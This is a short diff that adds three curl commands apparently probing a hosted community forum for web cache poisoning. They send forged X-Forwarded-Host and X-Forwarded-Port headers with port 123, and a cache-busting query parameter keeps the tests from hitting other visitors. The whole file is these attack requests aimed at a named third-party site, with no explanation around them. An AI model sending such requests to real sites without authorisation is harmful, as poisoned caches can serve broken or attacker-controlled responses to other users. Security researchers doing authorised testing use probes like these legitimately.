@@ -1,0 +1,5 @@
+curl -H 'X-Forwarded-port:123' https://rinkerboats.vanillacommunities.com/discussions?donotpoisoneveryone=1
+
+curl -H X-Forwarded-Host:https://rinkerboats.vanillacommunities.com/discussions?donotpoisoneveryone=1:123
+
+curl -H 'X-Forwarded-Host:rinkerboats.vanillacommunities.com:123' https://rinkerboats.vanillacommunities.com/discussions?donotpoisoneveryone=1
